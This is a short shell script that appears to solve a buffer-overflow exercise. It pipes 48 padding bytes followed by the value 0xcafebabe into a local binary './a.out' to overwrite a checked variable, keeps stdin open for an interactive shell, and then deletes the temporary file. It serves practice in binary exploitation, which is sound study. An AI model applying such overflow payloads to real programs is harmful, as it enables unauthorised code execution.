#!/usr/bin/env sh

python2 -c "print 'A' * 48 + '\xbe\xba\xfe\xca'" > temp
(cat temp ; cat ) | ./a.out
rm temp
